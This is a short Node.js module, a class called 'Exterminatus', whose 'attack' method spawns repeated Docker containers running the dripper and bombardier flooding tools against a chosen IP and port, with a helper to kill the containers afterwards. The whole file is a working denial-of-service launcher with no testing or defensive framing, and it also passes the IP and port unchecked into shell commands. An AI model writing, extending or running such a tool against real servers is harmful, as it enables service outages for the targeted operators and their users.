const { exec } = require('child_process');

class Exterminatus {
  getCmd(ip, port, type, id) {
    switch (type) {
      case 'dripper':
        return `docker run --rm --name="container${id}" alexmon1989/dripper:latest -s ${ip} -p ${port} -t 100`;
      case `bombardier`:
        return `docker run --rm --name="container${id}" alpine/bombardier -c 1000 -d 60s -l ${ip}:${port}`;
      default:
        return undefined;
    }
  }

  attack(ip, port, type, times) {
    for (let i = times; i !== 0; i--) {
      const cmd = this.getCmd(ip, port, type, i);
      console.info(cmd);
      setTimeout(() => {
        exec(cmd, (error, stdout, stderr) => {
          if (error) {
            console.error(error);
            return;
          }

          if (stderr) {
            console.error(stderr);
            return;
          }

          console.info(stdout);
        });
      });
    }
  }

  killContainers(times) {
    const containers = new Array(times).fill('container').map((v, i) => `${v}${i + 1}`).join(' ');
    const cmd = `docker container kill ${containers}`;
    console.info(cmd);
    setTimeout(() => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) {
          console.error(error);
          return;
        }

        if (stderr) {
          console.error(stderr);
          return;
        }

        console.info(stdout);
      });
    });
  }
}

module.exports.default = new Exterminatus();